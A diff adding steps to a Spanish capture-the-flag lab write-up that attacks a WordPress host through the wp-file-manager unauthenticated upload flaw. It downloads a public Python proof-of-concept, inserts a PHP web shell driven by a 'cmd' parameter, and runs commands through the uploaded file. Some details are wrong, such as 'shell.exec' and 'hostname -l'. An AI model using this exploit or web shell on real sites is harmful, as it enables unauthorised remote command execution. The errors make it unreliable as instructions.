@@ -116,8 +116,33 @@ Como lo que queríamos era buscar plugions de wordpress que fuesen vulnerables p
 ```
 -wpscan --url http://wordpress.aragog.hogwarts/blog/ --enumerate u,vp --plugin-detection agressive --api-token=$wpapi
 ```
-Podemos encontrar que ha detectado varios plugins con vulnerabilidades, pero de todos esos el que mas me llama la atención es uno que me permite subir archivos de sin autenticarme y que de ahí puede derivar en una ejecución remota de comandos.[mas información](https://wpscan.com/vulnerability/e528ae38-72f0-49ff-9878-922eff59ace9/)
+Podemos encontrar que ha detectado varios plugins con vulnerabilidades, pero de todos esos el que mas me llama la atención es uno que me permite subir archivos de sin autenticarme y que de ahí puede derivar en una ejecución remota de comandos.
+En esta [web](https://wpscan.com/vulnerability/e528ae38-72f0-49ff-9878-922eff59ace9/) nos dejan un POC (proof of concept) donde entro de este tenemos el script en Python que nos permite subir archivos remotamente.
+Para descargarlo haremos un `wget` del archivo
+```
+wget https://ypcs.fi/misc/code/pocs/2020-wp-file-manager-v67.py
+```
+Si hacemos un `cat` mas el archivo que acabamos de instalar podemos ver el código python.
 
+Al archivo le añadiremos lo siguiente, pero primero hemos de entrar al archivo como root
+```
+sudo nano 2020-wp-file-manager-v67.py
+```
+Simplemente le indicamos que queremos una shell[^5], añadiendo:
+```
+<?php
+echo "<pre>" . shell.exec($_REQUEST['cmd']) . "</pre>";
+?>
+```
+Guardamos (ctrl + s) y salimos (ctrl + x)
+Ahora hemos de juntar el escript en la url de la web, poniendo el siguiente comando.
+```
+python3 2020-wp-file-manager-v67.py http://wordpress.aragog.hogwarts/blog/
+```
+Si entramos a la url : `http://wordpress.aragog.hogwarts/blog/wp-content/plugins/wp-file-manager/lib/php/../files/payload.php` no nos mostrará nada ya que hemos de poner un comando al final del link añadiendole al final de la url `cmd=COMANDO_QUE_QUERAMOS`
+
+![13 cap_cmdURL](https://github.com/Vicctoriaa/VISMA/assets/153718557/ae1e931c-e063-453a-8bf3-98313735ba11)
+> En este ejemplo se muestra el comando `hostname -l` que nos dice la ip
 
 
 
@@ -144,3 +169,4 @@ https://www.instagram.com/
 [^2]: lenguaje que maneja el diseño y presentación de las páginas web, es decir, cómo lucen cuando un usuario las visita.
 [^3]: inspecciona los datos internos de las webs, identificando la programación que se ha utilizado para desarrollarla, también es una extensión que hemos de añadir buscandola directamente desde internet. 
 [^4]: herramienta especializada en escanear páginas de wordpress en busca de vulnerabilidades.
+[^5]: interfaz de usuario de línea de comandos particular que se utiliza para comunicarse con el núcleo de Linux
